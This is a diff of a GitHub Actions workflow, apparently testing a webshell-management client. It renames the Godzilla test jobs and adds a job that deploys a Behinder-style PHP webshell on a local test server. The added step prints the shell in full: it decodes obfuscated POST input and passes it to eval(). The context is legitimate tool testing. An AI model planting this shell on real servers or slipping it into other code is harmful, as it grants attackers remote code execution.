@@ -10,7 +10,7 @@ on:
       - ".github/workflows/wsm-test.yml"
 
 jobs:
-  setup-iis:
+  setup-iis-aspnet-4_5:
     runs-on: windows-latest
     steps:
       - name: Checkout code
@@ -154,7 +154,7 @@ jobs:
           }
       - name: Run Tests
         run: |
-          go test -timeout 20s -run TestNewGodzillaBase64Aspx ./common/wsm
+          go test -timeout 20s -run TestMUSTPASS_Godzilla_ASPX_Base64 ./common/wsm
   setup-jdk-1_8:
     runs-on: windows-latest
     steps:
@@ -223,4 +223,52 @@ jobs:
       #   shell: pwsh
       - name: Run JSP Shell Tests
         run: |
-          go test -timeout 30s -run ^TestNewGodzillaBase64Jsp$ ./common/wsm
+          go test -timeout 30s -run TestMUSTPASS_Godzilla_JSP_Base64 ./common/wsm
+  start-php-5_4_45:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup PHP 5.4.45
+        run: |
+          Invoke-WebRequest -Uri "https://windows.php.net/downloads/releases/archives/php-5.4.45-Win32-VC9-x86.zip" -OutFile "php.zip"
+          Expand-Archive -Path "php.zip" -DestinationPath "$env:RUNNER_TEMP\php"
+          echo "$env:RUNNER_TEMP\php" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+      - name: Deploy Behinder PHP Shell
+        run: |
+          $directoryPath = "C:\phpwww"
+          $filePath = "$directoryPath\bx4-bs64.php"
+          $content = @"
+          <?php
+            function Decrypt(`$data) {
+                `$data = substr(`$data, 37, strlen(`$data) - 40);
+                `$data = str_replace('go0p', '+', `$data);
+                `$data = str_replace('yakit', '/', `$data);
+                return base64_decode(`$data);
+            }
+            `$post = Decrypt(file_get_contents('php://input'));
+            eval(`$post);
+          ?>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+
+          # Write content to files
+          $content | Out-File -FilePath $filePath -Encoding UTF8
+
+          $fileContent = Get-Content -Path $filePath
+          Write-Host "File content of ${filePath}:"
+          Write-Host $fileContent
+      - name: Start PHP server # 后台运行
+        run: |
+          Start-Process -FilePath "php" -ArgumentList "-S 127.0.0.1:8086 -t C:\phpwww"
+        shell: pwsh
+      - name: Wait for server to start
+        run: Start-Sleep -Seconds 5
+      - name: Run PHP Shell Tests
+        run: |
+          go test -timeout 30s -run TestMUSTPASS_Behinder_PHP ./common/wsm
